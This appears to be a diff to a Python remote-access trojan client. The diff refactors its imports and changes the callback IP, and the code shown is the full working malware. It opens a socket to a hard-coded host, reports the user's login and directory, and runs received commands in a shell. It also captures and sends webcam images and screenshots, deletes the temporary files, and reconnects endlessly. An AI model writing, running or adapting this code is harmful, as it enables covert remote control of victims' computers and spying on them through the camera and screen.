@@ -1,23 +1,24 @@
-import socket
-import os
-import pyautogui
-import re
-import time
-import subprocess
-import cv2
+from socket import socket, AF_INET, SOCK_STREAM
+from os import getcwd, getlogin, chdir
+from pyautogui import screenshot
+from re import findall
+from time import sleep
+from subprocess import Popen, PIPE
+from cv2 import VideoCapture, imwrite
+#from cv2 import VideoCapture,imwrite
 
 def webcam(s):
-    cap = cv2.VideoCapture(0)
+    cap = VideoCapture(0)
     ret,frame = cap.read()
-    cv2.imwrite('ss.png',frame)
+    imwrite('ss.png',frame)
     transfer(s, "ss.png")
-    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    Popen("del /Q ss.png", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
 
 def screenshots(s):
-    ss = pyautogui.screenshot()
+    ss = screenshot()
     ss.save("ss.png")
     transfer(s, "ss.png")
-    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    Popen("del /Q ss.png", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
 
 
 def transfer(s, filename):
@@ -42,7 +43,7 @@ def get(s, filename):
     f.close()
 
 def socketCreation():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket(AF_INET, SOCK_STREAM)
     #print("Socket Created!")
     return s
 
@@ -55,26 +56,26 @@ def socketConnection(s, ip, port):
         socketConnection(s, ip, port)
 
 def cmd(s):
-    s.send(os.getcwd().encode())
-    s.send(os.getlogin().encode())
+    s.send(getcwd().encode())
+    s.send(getlogin().encode())
     while True:
         cmd = s.recv(2048).decode()
         cmd = cmd.lower()
         temp = cmd.split(" ")
         if temp[0] == 'cd':
             if temp[1] == '..':
-                cwd = os.getcwd()
+                cwd = getcwd()
                 cwd = cwd.split("\\")
                 tcwd = ""
                 for i in range(len(cwd)-1):
                     tcwd += cwd[i] + "\\"
-                os.chdir(tcwd)
-                s.send((os.getcwd() + ">").encode())
+                chdir(tcwd)
+                s.send((getcwd() + ">").encode())
                 s.send("Directory Changed...".encode())
             else:
-                cmd = re.findall("cd (.+)", cmd)
-                os.chdir(cmd[0])
-                s.send((os.getcwd() + ">").encode())
+                cmd = findall("cd (.+)", cmd)
+                chdir(cmd[0])
+                s.send((getcwd() + ">").encode())
                 s.send("Directory Changed...".encode())
         elif cmd == "exit":
             break
@@ -91,8 +92,8 @@ def cmd(s):
             webcam(s)
             continue
         else:
-            s.send((os.getcwd() + ">").encode())
-            cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send((getcwd() + ">").encode())
+            cmd = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
             t = cmd.stdout.read().decode()
             if t == "":
                 s.send("Command Executed....".encode())
@@ -101,16 +102,16 @@ def cmd(s):
     s.close()
 
 def main():
-    ip = '10.0.0.2'
+    ip = '127.0.0.1'
     port = 1234
     s = socketCreation()
     socketConnection(s, ip, port)
     try:
         cmd(s)
     except:
-        time.sleep(1)
+        sleep(1)
         main()
-    time.sleep(1)
+    sleep(1)
     main()
 
 
